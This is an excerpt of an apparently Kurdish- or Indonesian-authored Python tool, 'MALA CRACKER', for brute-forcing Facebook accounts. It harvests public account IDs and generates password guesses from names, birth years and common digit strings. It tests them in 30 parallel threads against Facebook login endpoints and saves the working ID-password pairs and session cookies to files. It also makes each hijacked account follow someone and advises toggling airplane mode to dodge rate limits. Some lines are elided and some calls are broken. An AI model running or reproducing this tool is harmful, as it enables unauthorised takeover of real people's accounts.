...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             CINTO MANDI : [green]SEJAHTERA SELAMANYA[blue] '))
...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m   Barezm Id kat active nya Tkaya bo Active krdn NAME bnera bo telegram @X6_1M") 

      os.system('xdg-open  https://t.me/X6_1M')
...
def menu(my_name,my_id):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \033[0;34mNAWT  : '+str(my_name))
	print(x+'['+h+'•'+x+'] \033[0;34mIDYAKAT    : '+str(my_id))
	#print(x+'['+h+'•'+x+'] \033[93mTanggal Croot  : '+str(birth))
	print(x+'['+h+'•'+x+'] \033[923m IPYAKAT    : '+str(sh['origin']))
	cetak(nel('\t[bold cyan]             • MALA CRACKER • [/bold cyan]'))	
	print('') 
	cetak(nel('[bold blue]➣1. CRACK ID PUBLIG 10\n➣2. CRACK ID POLO\n➣3. CRACK FOLOW\n➣4. CHEK CRACK\n➣5. CRACK FILE \n➣00.EXET[bold blue]'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('➥➥➣HOW MUCH ID  ? : '))
	except ValueError:
		print('{k}➥➥➣ID NOT PUBLIG ')
		exit()
	if jum<1 or jum>100:
	...
	try:
		print('')
		print(f'{k}➥➥➣Total Id Number★{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	met = '# SETTING CLONE ID'
	sol().print(mark(met, style='green'))
	cetak(nel('[bold blue]➣1. CRACK ID OLD\n➣2. CRACK ID NEW\n➣3. CRACK RANDOM[bold blue]'))
	...
	cetak(nel('[bold blue]➣1. MITHOT API\n➣2. MITHOD M-FACEBOOK\n➣3. MITHOD FREE[bold blue]'))
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
	...
	passmenu()
def passmenu():
	cetak(nel('\t[bold cyan]             • pass crack • [/bold cyan]'))	
	print('') 
	cetak(nel('[bold blue]➣1. name digit pass\n➣2. all name + pass\n➣3. name+birthday pass\n➣4. all name+ brthday pass\n➣5. Arab pass °just arab id° \n➣6. ALL PASS IN HERE °slow° [bold blue]')) 
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		passwrd()()
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'       {M}MALA CRACK    ')
	met = '# CLON HAS BEEN STARTS'
	sol().print(mark(met, style='green'))
	ioz = 'Play Airplan mode 10 second after 1k Idz his tooll pawerid by >>>MALA<<< wait for cloning °happy cloning bro° '
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title='WAIT'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[blue]➥➥➣[green] Crack has bee compled brwwt[blue] <<[yellow] '))
	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
	print('{k}➥➥➣you wont crack again  ( Y/t ) ? ')
	woi = input('➥➥➣Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}➥➥➣{k} Good Bye BROO{u} ')
		time.sleep(2)
		exit()
#
def name():
		...
		for yuzong in id2:
			try:
				...
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"1212",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"1122",xz[0]+xz[1]+"12",xz[0]+xz[1]+"112233"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"1212",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"1122",xz[0]+xz[1]+"12",xz[0]+xz[1]+"112233"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				...
				xz = nmf.split(' ')
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"2005", xz[0]+xz[1]+"2004",xz[0]+xz[1]+"2001",xz[0]+xz[1]+"2002",xz[0]+xz[1]+"2003",xz[0]+xz[1]+"1999",xz[0]+xz[1]+"1998"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"2005", xz[0]+xz[1]+"2004",xz[0]+xz[1]+"2001",xz[0]+xz[1]+"2002",xz[0]+xz[1]+"2003",xz[0]+xz[1]+"1999",xz[0]+xz[1]+"1998"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
...
def passwrdnumber():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv =  ['1234554321','1122334455','1234512345','112233445566','123456654321','123456123456','123456','123456789','12345678','889900','778899','112233']
			if 'ya' in taplikasi:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s •L➳L᭄MALA• %s/%s ••• OK:%s ••• CP:%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ M➳Ⓠ᭄MALA-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ M➳Ⓠ᭄MALA-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[0;1m7afyata \033[33;1mCP: {idf};{pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = po.cookies.get_dict()
				...
				print('\n')
				print(f'\033[0;1mZamana \033[32;1mOK: {idf};{pw};{kuki}')
				ok+= 1
				break
...
def cracktouch(idf,pwv):
	...
	fff = '%'
	fff = '%'
	print('\r%s •Q➳᭄MALA• %s/%s ••• OK:%s ••• CP:%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
...
def crackmbasic(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [MALA-CP] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [MALA-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/DEDAR-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
